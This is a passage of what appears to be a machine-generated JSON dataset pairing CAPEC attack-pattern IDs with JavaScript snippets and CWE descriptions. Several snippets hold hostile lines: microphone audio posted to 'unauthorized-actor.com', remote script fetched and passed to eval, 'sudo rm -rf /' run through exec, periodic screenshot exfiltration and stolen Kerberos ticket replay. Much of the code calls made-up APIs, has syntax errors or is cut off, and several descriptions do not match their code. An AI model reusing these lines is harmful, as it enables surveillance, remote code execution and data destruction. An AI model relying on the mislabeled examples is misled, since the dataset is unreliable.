        "code_snippet": "const kerberos = require('kerberos');\n\n// CWE-522: Insufficiently Protected Credentials\nconst ticket = 'stolen_ticket';\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst capturedTicket = 'captured_ticket';\n\n// CWE-308: Use of Single-factor Authentication\nconst username = 'username';\nconst password = 'password';\n\n// CWE-322: Key Exchange without Entity Authentication\nconst keyExchange = kerberos.keyExchange(username, password);\n\n// CWE-1292: Incorrect Conversion of Security Identifiers\nconst securityIdentifier = 'incorrectly_converted_identifier';\n\n// Using the stolen ticket to access the system/resource\nkerberos.authenticate(ticket, (err, context) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log('Authenticated using stolen ticket');\n  }\n});\n\n// Using the captured ticket to bypass authentication\nkerberos.authenticate(capturedTicket, (err, context) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log('Authenticated using captured ticket');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of using stolen Kerberos tickets to access systems/resources. It highlights the related CWEs, including insufficiently protected credentials, authentication bypass by capture-replay, use of single-factor authentication, key exchange without entity authentication, and incorrect conversion of security identifiers. The code uses the stolen ticket to authenticate to the system/resource, and also demonstrates the capture-replay attack by using a captured ticket to bypass authentication."
    },
    {
        "capec_id": "646",
        "code_snippet": "const fs = require('fs');\nconst usbDevices = fs.readdirSync('/dev/bus/usb');\nconst systemInfo = require('os').uptime();\nconst deviceNames = ['AUX', 'CON', 'PRN', 'LPT1', 'COM1'];\n\nfor (let i = 0; i < usbDevices.length; i++) {\n    if (deviceNames.includes(usbDevices[i])) {\n        console.log(`Found connected device: ${usbDevices[i]}`);\n    }\n}\n\nconsole.log(`System uptime: ${systemInfo} seconds`);\n\n// Undocumented feature: accessing physical side channels\nconst exec = require('child_process').exec;\nexec('powercfg /energy', (error, stdout, stderr) => {\n    if (error) {\n        console.error(`exec error: ${error}`);\n        return;\n    }\n    console.log(`Power consumption information: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of obtaining information about attached peripheral devices and components connected to a computer system. It uses the fs module to read the USB device directory, the os module to get system uptime, and an undocumented feature to access physical side channels. The code also includes a CWE-67 vulnerability by not properly handling Windows device names. CWE-200, CWE-497, CWE-1300, and CWE-1242 are also relevant to this code snippet."
    },
    {
        "capec_id": "647",
        "code_snippet": "const reg = require('registry');\n\n// CWE-285: Improper Authorization\nif (true) { // Always true, no actual authorization check\n  const sensitiveData = reg.get('HKCU\\\\Software\\\\MyApp\\\\SensitiveData');\n  console.log(sensitiveData);\n}\n\n// CWE-314: Cleartext Storage in the Registry\nreg.set('HKCU\\\\Software\\\\MyApp\\\\SensitiveData', 'mySecretData');\n\n// CWE-497: Exposure of Sensitive System Information\nconst systemInfo = reg.get('HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment');\nconsole.log(systemInfo);\n\n// CWE-1262: Improper Access Control for Register Interface\n// (Note: This CWE is more relevant to low-level system programming, not JavaScript)\n\n// CWE-1422: Exposure of Sensitive Information caused by Incorrect Data Forwarding during Transient Execution\n// (Note: This CWE is more relevant to low-level system programming, not JavaScript)",
        "description": "JavaScript code snippet demonstrating the CAPEC of exploiting weaknesses in authorization to gather system-specific data and sensitive information within a registry. The code includes examples of CWE-285 (Improper Authorization), CWE-314 (Cleartext Storage in the Registry), and CWE-497 (Exposure of Sensitive System Information). CWE-1262 and CWE-1422 are not directly applicable to JavaScript, but are included for context."
    },
    {
        "capec_id": "648",
        "code_snippet": "const screenshot = require('screenshot-desktop');\nconst fs = require('fs');\nconst net = require('net');\n\nfunction captureScreen() {\n  screenshot.listDisplays().then((displays) => {\n    const display = displays[0];\n    screenshot.capture({\n      filename: 'screenshot.jpg',\n      screen: display.id\n    }).then((filename) => {\n      const client = new net.Socket();\n      client.connect(8080, 'localhost', () => {\n        client.write(fs.readFileSync(filename));\n      });\n    });\n  });\n}\n\nsetInterval(captureScreen, 1000);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of screen capture functionality. It uses the 'screenshot-desktop' library to capture the screen every second and sends the screenshot to a local server via a socket. The CWEs embodied in this code snippet include CWE-267 (Privilege Defined With Unsafe Actions) as the screen capture functionality is not properly restricted, CWE-222 (Truncation of Security-relevant Information) as the screenshot may contain sensitive information, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) as the screenshot is sent to an unauthorized actor, CWE-319 (Cleartext Transmission of Sensitive Information) as the screenshot is sent in cleartext, and CWE-294 (Authentication Bypass by Capture-replay) as the screenshot could be used to bypass authentication."
    },
    {
        "capec_id": "649",
        "code_snippet": "const fs = require('fs');\n\nfunction processFile(filename) {\n  if (fs.existsSync(filename)) {\n    const fileExtension = filename.split('.').pop();\n    if (fileExtension === 'exe') {\n      // execute the file\n      require('child_process').exec(filename);\n    } else if (fileExtension === 'txt') {\n      // read the file\n      fs.readFile(filename, 'utf8', (err, data) => {\n        console.log(data);\n      });\n    }\n  }\n}\n\n// vulnerable code\nprocessFile('malicious_file .exe');",
        "description": "This code snippet demonstrates a vulnerability where an adversary adds a space character to the end of a file extension, taking advantage of an application that does not properly neutralize trailing special elements in file names. The processFile function checks the file extension and executes the file if it's an .exe, or reads the file if it's a .txt. However, the function does not properly validate the file name, allowing an attacker to add a space to the end of the file extension and potentially execute a malicious file."
    },
    {
        "capec_id": "650",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst multer = require('multer');\nconst upload = multer({ dest: './uploads/' });\n\napp.post('/upload', upload.any(), (req, res) => {\n  if (!req.files || req.files.length === 0) {\n    return res.status(400).send({ message: 'No files were uploaded.' });\n  }\n  res.send(`File uploaded successfully!`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable Node.js server that allows unrestricted file uploads, which can lead to the execution of malicious code. The server uses the multer middleware to handle file uploads, but it does not validate the type of files being uploaded. An attacker can upload a malicious file, such as a web shell, to the server and execute it remotely, potentially gaining elevated privileges. The lack of authentication and authorization mechanisms (CWE-287) and the exposure of the upload directory (CWE-553) make this server vulnerable to attack. Additionally, the server's reliance on client-side validation (CWE-602) and the lack of input validation (CWE-434) further exacerbate the vulnerability."
    },
    {
        "capec_id": "651",
        "code_snippet": "const microphone = navigator.mediaDevices.getUserMedia({ audio: true });\nconst audioContext = new AudioContext();\nconst source = audioContext.createMediaStreamSource(microphone);\nconst scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);\nscriptProcessor.onaudioprocess = (event) => {\n  const audioData = event.inputBuffer.getChannelData(0);\n  // Send audio data to unauthorized actor\n  fetch('https://unauthorized-actor.com/record', {\n    method: 'POST',\n    body: JSON.stringify(audioData),\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  });\n};\nsource.connect(scriptProcessor);\nscriptProcessor.connect(audioContext.destination);",
        "description": "This code snippet demonstrates eavesdropping by accessing the user's microphone and sending the raw audio data to an unauthorized actor. It exploits CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting sensitive audio data in cleartext. Additionally, it relates to CWE-514 (Covert Channel) and CWE-515 (Covert Storage Channel) as it uses the audio data to convey encoded information. Furthermore, it is vulnerable to CWE-1300 (Improper Protection of Physical Side Channels) as it does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information."
    },
    {
        "capec_id": "652",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst kerberos = require('kerberos');\n\n// CWE-522: Insufficiently Protected Credentials\nconst credentials = {\n  username: 'user\",\n  password: 'password'\n};\n\n// CWE-307: Improper Restriction of Excessive Authentication Attempts\nlet attempts = 0;\n\napp.post('/login', (req, res) => {\n  attempts++;\n  if (attempts > 10) {\n    res.status(429).send('Too many attempts');\n    return;\n  }\n\n  // CWE-308: Use of Single-factor Authentication\n  const username = req.body.username;\n  const password = req.body.password;\n\n  if (username === credentials.username && password === credentials.password) {\n    // CWE-309: Use of Password System for Primary Authentication\n    // CWE-262: Not Using Password Aging\n    // CWE-263: Password Aging with Long Expiration\n    const ticket = kerberos.getTicket(username, password);\n    res.send(ticket);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\n// CWE-654: Reliance on a Single Factor in a Security Decision\napp.get('/protected', (req, res) => {\n  const ticket = req.header('Authorization');\n  if (ticket) {\n    res.send('Welcome!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// CWE-294: Authentication Bypass by Capture-replay\napp.post('/replay', (req, res) => {\n  const ticket = req.body.ticket;\n  if (ticket) {\n    res.send('Replayed!');\n  } else {\n    res.status(401).send('Invalid ticket');\n  }\n});\n\n// CWE-836: Use of Password Hash Instead of Password for Authentication\napp.post('/hash', (req, res) => {\n  const hash = req.body.hash;\n  if (hash === credentials.password) {\n    res.send('Authenticated!');\n  } else {\n    res.status(401).send('Invalid hash');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of an adversary obtaining legitimate Kerberos credentials to achieve authenticated access to additional systems. It includes several CWEs, such as insufficiently protected credentials, improper restriction of excessive authentication attempts, use of single-factor authentication, and more. The code uses the Kerberos library to generate a ticket, which is then used for authentication. However, it lacks proper security measures, making it vulnerable to various attacks."
    },
    {
        "capec_id": "653",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user': 'password123'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that uses single-factor authentication with a weak password storage mechanism. The passwords are stored in plain text in a JavaScript object, making it susceptible to unauthorized access. The code also lacks any mechanism for password aging, and there is no restriction on excessive authentication attempts, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "654",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.get('/', (req, res) => {\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.write('<iframe src=\"https://example.com/login\" frameborder=\"0\" width=\"100%\" height=\"100%\"></iframe>');\n  res.end();\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that uses an iframe to load a login page from a different domain, impersonating a credential prompt to steal user credentials. The application uses hard-coded credentials (CWE-798) and insufficiently protected credentials (CWE-522) for authentication. Additionally, the application does not restrict rendered UI layers or frames (CWE-1021), allowing the iframe to load the malicious login page. The use of weak credentials (CWE-1391) and ASP.NET misconfiguration (CWE-556) are also implied in this scenario."
    },
    {
        "capec_id": "655",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\napp.post('/upload', (req, res) => {\n  let file = req.files.file;\n  let tempFilePath = path.join(__dirname, './uploads/' + file.name);\n  fs.writeFileSync(tempFilePath, file.data);\n\n  // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n  let fileType = file.name.split('.').pop();\n  if (fileType === 'exe' || fileType === 'js') {\n    // Process the file as executable/script\n    require(tempFilePath);\n  }\n\n  // CWE-532: Insertion of Sensitive Information into Log File\n  console.log(`File uploaded: ${tempFilePath}`);\n\n  // CWE-377: Insecure Temporary File\n  let logFile = fs.createWriteStream('log.txt', {\n    flags: 'a'\n  });\n  logFile.write(`File uploaded: ${tempFilePath}\\n`);\n\n  // CWE-541: Inclusion of Sensitive Information in an Include File\n  let includeFile = fs.readFileSync('include.txt', 'utf8');\n  console.log(includeFile);\n\n  // CAPEC: Adding data to a file to increase the file size beyond what security tools are capable of handling\n  let largeFile = fs.createWriteStream('largeFile.txt');\n  for (let i = 0; i < 1000000; i++) {\n    largeFile.write('Random data to increase file size\\n');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable file upload functionality that allows an attacker to upload malicious files, including executable scripts. The code relies on the file name and extension to determine the appropriate behavior, which can be exploited by an attacker. The uploaded file is written to a temporary location, and sensitive information is logged to a file. The code also includes sensitive information in an include file. Finally, the code generates a large file to demonstrate the CAPEC, which can be used to evade security tools."
    },
    {
        "capec_id": "656",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst phoneAuth = require('./phoneAuth');\n\napp.post('/verify', (req, res) => {\n  const phoneNumber = req.body.phoneNumber;\n  const password = req.body.password;\n  phoneAuth.authenticate(phoneNumber, password, (err, user) => {\n    if (err) {\n      // CWE-307: No rate limiting or IP blocking for excessive authentication attempts\n      res.status(401).send('Invalid credentials');\n    } else {\n      // CWE-522: Credentials are sent in plain text over an insecure channel\n      const credentials = {\n        phoneNumber: phoneNumber,\n        password: password\n      };\n      res.json(credentials);\n    }\n  });\n});\n\napp.post('/updateInfo', (req, res) => {\n  const phoneNumber = req.body.phoneNumber;\n  const personalInfo = req.body.personalInfo;\n  // CWE-359: Exposure of private personal information to an unauthorized actor\n  // CWE-940: No verification of the source of the communication channel\n  phoneAuth.updateInfo(phoneNumber, personalInfo, (err, user) => {\n    if (err) {\n      res.status(500).send('Error updating information');\n    } else {\n      res.json(user);\n    }\n  });\n});",
        "description": "A vulnerable Node.js server that handles voice phishing attacks, allowing an adversary to solicit sensitive information from users. The server does not properly verify the source of incoming requests, does not restrict excessive authentication attempts, and transmits credentials in plain text over an insecure channel. Additionally, it exposes private personal information to unauthorized actors."
    },
    {
        "capec_id": "657",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://malicious-update-server.com/update.js', true);\nxhr.onload = function() {\n    if (xhr.status === 200) {\n        eval(xhr.responseText);\n    }\n};\nxhr.send();",
        "description": "JavaScript code snippet that downloads and executes malicious code from a remote location without integrity checks, leveraging CWE-494. The code uses XMLHttpRequest to fetch a script from a malicious server and executes it using the eval function, allowing the attacker to inject malicious code into the client-side application. This code also relates to CWE-506 (Embedded Malicious Code) and CWE-79 (Cross-site Scripting) as it fails to neutralize user-controllable input and executes untrusted code."
    },
    {
        "capec_id": "660",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('childProcess');\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst untrustedLibrary = require('untrusted-library');\n\n// CWE-494: Download of Code Without Integrity Check\nconst downloadCode = (url) => {\n  const code = fs.readFileSync(url, 'utf8');\n  eval(code);\n};\n\n// CWE-939: Improper Authorization in Handler for Custom URL Scheme\nconst customUrlSchemeHandler = (url) => {\n  const command = url.split(':')[1];\n  childProcess.exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.log(`stderr: ${stderr}`);\n  });\n};\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst sensitiveSystemInfo = childProcess.execSync('systeminfo');\nconsole.log(sensitiveSystemInfo);\n\n// CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nconst userInput = 'rm -rf /';\nchildProcess.exec(`sudo ${userInput}`, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});",
        "description": "This code snippet demonstrates the CAPEC of evading Root/Jailbreak detection on a mobile device by hooking code. It includes functionality from an untrusted control sphere, downloads code without integrity checks, uses a custom URL scheme handler without proper authorization, exposes sensitive system information, and is vulnerable to OS command injection. The code uses Node.js modules and functions to simulate the described vulnerabilities."
    },
    {
        "capec_id": "661",
        "code_snippet": "const fs = require('fs');\nconst childProcess = require('childProcess');\n\n// CWE-489: Active Debug Code\nconst debugMode = true;\nif (debugMode) {\n  const debugger = childProcess.spawn('gdb', ['-p', process.pid]);\n  debugger.stdout.on('data', (data) => {\n    console.log(`Debugger output: ${data}`);\n  });\n}\n\n// CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\nconst debugInterface = '/dev/debug_interface';\nfs.chmodSync(debugInterface, '0777');\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = childProcess.execSync('cat /proc/cpuinfo');\nconsole.log(`System Info: ${systemInfo}`);\n\n// CWE-1247: Improper Protection Against Voltage and Clock Glitches\nconst voltageGlitch = () => {\n  // Simulate voltage glitch\n  console.log('Voltage glitch detected!');\n};\n\n// CWE-1323: Improper Management of Sensitive Trace Data\nconst traceData = fs.readFileSync('/sys/kernel/debug/tracing/trace', 'utf8');\nconsole.log(`Trace Data: ${traceData}`);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of inserting a debugger into a mobile application to evade Root/Jailbreak detection. It includes CWEs such as active debug code, improper access control to debug interfaces, exposure of sensitive system information, improper protection against voltage and clock glitches, and improper management of sensitive trace data."
    },
    {
        "capec_id": "662",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://example.com/malicious_code.js', true);\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const maliciousCode = xhr.responseText;\n    eval(maliciousCode);\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet downloads malicious code from a remote location without verifying its integrity, and then executes it using the eval() function, allowing an attacker to manipulate traffic between two endpoints. The code also relies on the client-side to implement security mechanisms, which can be exploited by an attacker. Additionally, the code is vulnerable to context switching race conditions and embedded malicious code."
    },
    {
        "capec_id": "663",
        "code_snippet": "function speculativeExecutionAttack(secretData) {\n\t// CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n\t// The processor optimizes the execution of the program, removing or modifying security-critical code\n\tvar optimizedCode = optimizeCodeForPerformance(secretData);\n\n\t// CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n\t// Shared hardware structures (e.g., caches and branch predictors) violate expected architecture isolation\n\tvar sharedResource = getSharedResource();\n\tsharedResource.access(secretData);\n\n\t// CWE-1264: Hardware Logic with Insecure De-Synchronization between Control and Data Channels\n\t// Incorrect forwarding of data before security checks are complete\n\tvar insecureData = getInsecureData();\n\tif (insecureData !== undefined) {\n\t\t// CWE-1420: Exposure of Sensitive Information during Transient Execution\n\t\t// Transient execution exposes data over a covert channel\n\t\tvar transientData = getTransientData(insecureData);\n\t\tif (transientData !== undefined) {\n\t\t\t// CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n\t\t\t// Microarchitectural state not properly cleared after transient execution\n\t\t\tvar exposedData = getExposedData(transientData);\n\t\t\tif (exposedData !== undefined) {\n\t\t\t\tconsole.log('Exposed data:', exposedData);\n\t\t\t}\n\t\t}\n\t}\n}\n",
        "description": "JavaScript code snippet demonstrating a speculative execution attack, exploiting hardware design flaws to expose sensitive data and bypass access control. The code leverages processor optimization, shared microarchitectural resources, insecure de-synchronization, transient execution, and microarchitectural state exposure to construct a covert channel and access restricted resources."
    },
    {
        "capec_id": "664",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/proxy', (req, res) => {\n  const url = req.query.url;\n  const https = require('https');\n  https.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.send(data);\n    });\n  }).on('error', (error) => {\n    res.send('Error: ' + error.message);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The /proxy endpoint takes a URL as an input parameter and makes an HTTPS request to that URL. The response from the URL is then sent back to the client. This allows an attacker to use the server to make requests to internal or external systems, potentially accessing sensitive data or systems. The code does not validate the input URL, making it vulnerable to SSRF (CWE-918). Additionally, the code does not implement any authentication or authorization mechanisms, making it vulnerable to Improper Input Validation (CWE-20) and External Control of Assumed-Immutable Web Parameter (CWE-472)."
    },
    {
        "capec_id": "665",
        "code_snippet": "const thunderboltController = {\n  authenticate: function(device) {\n    // CWE-862: Missing Authorization\n    if (device.type === 'trusted') {\n      return true;\n    }\n    // CWE-288: Authentication Bypass Using an Alternate Path or Channel\n    if (device.alternatePath) {\n      return true;\n    }\n    // CWE-1188: Initialization of a Resource with an Insecure Default\n    if (device.defaultAuth === true) {\n      return true;\n    }\n    return false;\n  },\n  verifyData: function(data) {\n    // CWE-345: Insufficient Verification of Data Authenticity\n    if (data.origin === 'unknown') {\n      return true;\n    }\n    // CWE-353: Missing Support for Integrity Check\n    if (!data.checksum) {\n      return true;\n    }\n    return false;\n  }\n};\n\nconst device = {\n  type: 'untrusted',\n  alternatePath: true,\n  defaultAuth: true\n};\n\nif (thunderboltController.authenticate(device)) {\n  const data = {\n    origin: 'unknown',\n    content: 'malicious_data'\n  };\n  if (thunderboltController.verifyData(data)) {\n    console.log('Vulnerability exploited!');\n  }\n}",
        "description": "This code snippet demonstrates a vulnerable Thunderbolt controller implementation that allows an adversary to manipulate the firmware and exploit vulnerabilities in the authorization and verification mechanisms. The code includes missing authorization checks, authentication bypass using an alternate path, insecure default initialization, insufficient data authenticity verification, and missing support for integrity checks."
    },
    {
        "capec_id": "666",
        "code_snippet": "const bluetooth = require('bluetooth');\n\n// CWE-246: Direct use of sockets\nconst socket = bluetooth.createSocket();\n\n// CWE-319: Cleartext transmission of sensitive information\nconst sensitiveData = 'password123';\nsocket.write(sensitiveData);\n\n// CWE-294: Authentication bypass by capture-replay\nconst capturedData = socket.read();\nsocket.write(capturedData);\n\n// CWE-924: Improper enforcement of message integrity during transmission\nconst message = 'malicious_data';\nsocket.write(message);\n\n// CWE-404: Improper resource shutdown or release\n// Not releasing the socket resource\n\n// CAPEC: Bluetooth flooding\nfor (let i = 0; i < 1000; i++) {\n  socket.write('large_packet');\n}\n",
        "description": "This code snippet demonstrates a Bluetooth flooding attack, which is a type of DoS attack that targets Bluetooth-enabled devices. The code uses the 'bluetooth' module to create a socket and transmit sensitive data in cleartext. It also captures and replays data to bypass authentication, and does not ensure the integrity of messages during transmission. Furthermore, the code does not release the socket resource, leading to improper resource shutdown or release. The code then floods the device with large packets, causing a denial of service."
    },
    {
        "capec_id": "667",
        "code_snippet": "const bluetooth = require('bluetooth');\n\n// CWE-290: Authentication Bypass by Spoofing\n// CWE-940: Improper Verification of Source of a Communication Channel\n// CWE-925: Improper Verification of Intent by Broadcast Receiver\n// CWE-1390: Weak Authentication\n// CWE-301: Reflection Attack in an Authentication Protocol\n\nfunction connectToDevice(deviceAddress) {\n  const spoofedMacAddress = '00:11:22:33:44:55'; // trusted device's MAC address\n  const device = bluetooth.connect(spoofedMacAddress);\n  if (device) {\n    console.log('Connected to device');\n    // perform malicious actions\n    device.sendFile('malicious_file.txt');\n  }\n}\n\nconnectToDevice('00:11:22:33:44:55');",
        "description": "JavaScript code snippet demonstrating a Bluetooth MAC address spoofing attack, allowing an adversary to authenticate as a trusted device and perform malicious actions."
    },
    {
        "capec_id": "668",
        "code_snippet": "const bluetooth = require('bluetooth');\n\n// CWE-757: Selection of Less-Secure Algorithm During Negotiation\nconst encryptionAlgorithms = ['AES-128', 'AES-256', 'Blowfish'];\nconst authenticationAlgorithms = ['SHA-1', 'SHA-256', 'MD5'];\n\n// CWE-285: Improper Authorization\nconst authorizedDevices = ['device1', 'device2'];\n\n// CWE-693: Protection Mechanism Failure\nconst entropyBits = 8;\n\n// CWE-1300: Improper Protection of Physical Side Channels\nconst powerConsumptionPattern = 'high';\n\n// CWE-425: Direct Request ('Forced Browsing')\nconst restrictedURLs = ['/secure', '/admin'];\n\n// Establish Bluetooth connection\nbluetooth.connect('device1', (err, device) => {\n  if (err) {\n    console.error(err);\n  } else {\n    // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n    const selectedEncryptionAlgorithm = encryptionAlgorithms[0];\n    const selectedAuthenticationAlgorithm = authenticationAlgorithms[0];\n\n    // CWE-285: Improper Authorization\n    if (!authorizedDevices.includes(device.name)) {\n      console.log('Unauthorized device');\n    } else {\n      // CWE-693: Protection Mechanism Failure\n      const encryptedData = encryptData(selectedEncryptionAlgorithm, entropyBits);\n      device.write(encryptedData);\n\n      // CWE-1300: Improper Protection of Physical Side Channels\n      const powerConsumption = getPowerConsumptionPattern(powerConsumptionPattern);\n      console.log('Power consumption pattern:', powerConsumption);\n\n      // CWE-425: Direct Request ('Forced Browsing')\n      const restrictedURL = restrictedURLs[0];\n      device.request(restrictedURL, (err, response) => {\n        if (err) {\n          console.error(err);\n        } else {\n          console.log(response);\n        }\n      });\n    }\n  }\n});\n\nfunction encryptData(algorithm, entropyBits) {\n  // Simulate encryption\n  return 'encrypted_data';\n}\n\nfunction getPowerConsumptionPattern(pattern) {\n  // Simulate power consumption pattern\n  return pattern;\n}",
        "description": "This code snippet demonstrates a vulnerable Bluetooth key negotiation implementation in JavaScript, incorporating multiple CWEs. It selects a less-secure encryption algorithm, fails to properly authorize devices, neglects to use sufficient protection mechanisms, and exposes sensitive information through physical side channels. Additionally, it allows direct requests to restricted URLs."
    },
    {
        "capec_id": "669",
        "code_snippet": "const updateServer = 'http://update.example.com';\nconst maliciousCode = 'eval(atob(\"ZG9jdW1lbnQucmV0dXJuKGV2YWwoIm1haW4oKTs=\")));';\n\nfunction generateUpdatePackage(firmwareVersion) {\n  const updatePackage = {\n    'firmwareVersion': firmwareVersion,\n    'updateScript': maliciousCode\n  };\n  return updatePackage;\n}\n\nfunction sendUpdateToFieldedSystems(updatePackage) {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', updateServer, true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify(updatePackage));\n}\n\n// Assume firmwareVersion is obtained from an untrusted input\nconst firmwareVersion = getFirmwareVersionFromUntrustedSource();\nconst updatePackage = generateUpdatePackage(firmwareVersion);\nsendUpdateToFieldedSystems(updatePackage);",
        "description": "This code snippet demonstrates a vulnerable update mechanism that allows an adversary to inject malicious code into the update package. The 'generateUpdatePackage' function takes a firmware version as input and returns an update package with the malicious code embedded. The 'sendUpdateToFieldedSystems' function sends the update package to the fielded systems. The firmware version is obtained from an untrusted source, making it vulnerable to CWE-807. The code also relates to CWE-1277, CWE-506, CWE-527, and CWE-1329 as it does not provide a secure way to update the firmware, contains malicious code, exposes the update mechanism to unauthorized access, and relies on an untrusted input for the firmware version."
    },
    {
        "capec_id": "670",
        "code_snippet": "const maliciousCompiler = require('malicious-compiler');\n\n// CWE-506: Embedded Malicious Code\nfunction vulnerableFunction() {\n  const sensitiveData = 'secretKey';\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  console.log(process.env);\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  eval('console.log(",
        "description": "This code snippet demonstrates the CAPEC of an adversary modifying development tools to inject malicious code. The malicious compiler is used to optimize the vulnerableFunction, which contains sensitive data and uses eval() to execute dynamic code. The code also logs sensitive system information and modifies security-critical code, illustrating CWEs 506, 497, 913, 733, and 1037."
    },
    {
        "capec_id": "671",
        "code_snippet": "const securityToken = generateSecurityToken(entity);\n\nif (securityToken === 'admin') {\n  // Allow access to restricted areas\n  accessRestrictedArea();\n} else {\n  // Deny access\n  denyAccess();\n}\n\nfunction generateSecurityToken(entity) {\n  // CWE-1270: Generation of Incorrect Security Tokens\n  // Incorrectly generated security token\n  return 'user';\n}\n\nfunction accessRestrictedArea() {\n  // CWE-1263: Improper Physical Access Control\n  // Unprotected confidential information\n  const confidentialInfo = getConfidentialInfo();\n  console.log(confidentialInfo);\n}\n\nfunction denyAccess() {\n  // CWE-1294: Insecure Security Identifier Mechanism\n  // Incorrectly implemented security identifier\n  const securityIdentifier = getSecurityIdentifier();\n  if (securityIdentifier === 'invalid') {\n    console.log('Access denied');\n  }\n}\n\n// CWE-1259: Improper Restriction of Security Token Assignment\n// Security token assignment is not properly restricted\nconst osatVendor = getOSATVendor();\nif (osatVendor === 'trusted') {\n  // Allow access to confidential information\n  accessConfidentialInfo();\n}\n\nfunction accessConfidentialInfo() {\n  // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n  // Confidential information is not protected from OSAT vendors\n  const confidentialInfo = getConfidentialInfo();\n  console.log(confidentialInfo);\n}",
        "description": "This code snippet demonstrates the CAPEC of an adversary maliciously altering requirements for an ASIC, resulting in a chip that may not meet user needs or contain malicious functionality. The code includes CWEs such as improper restriction of security token assignment, insecure security identifier mechanism, unprotected confidential information, generation of incorrect security tokens, and improper physical access control."
    },
    {
        "capec_id": "672",
        "code_snippet": "const maliciousCode = `while (true) {\n  // CWE-506: Embedded Malicious Code\n  const sensitiveData = readRegister(0x1234);\n  if (sensitiveData === 0xdeadbeef) {\n    // CWE-509: Replicating Malicious Code (Virus or Worm)\n    replicateMaliciousCode();\n  }\n  // CWE-1423: Exposure of Sensitive Information caused by Shared Microarchitectural Predictor State\n  const predictorState = getPredictorState();\n  if (predictorState === 0xabcdef) {\n    // CWE-1262: Improper Access Control for Register Interface\n    writeRegister(0x5678, 0xfeedface);\n  }\n  // CWE-1259: Improper Restriction of Security Token Assignment\n  const securityToken = getSecurityToken();\n  if (securityToken === 0x12345678) {\n    // Perform malicious action\n    console.log('Malicious action performed');\n  }\n}\n`; executeMaliciousCode(maliciousCode);",
        "description": "This code snippet demonstrates a malicious code embedded in a chip's program logic, which can be used to remotely control a host system and perform malicious acts. The code includes various CWEs, such as embedded malicious code, replicating malicious code, exposure of sensitive information, improper access control for register interface, and improper restriction of security token assignment."
    },
    {
        "capec_id": "673",
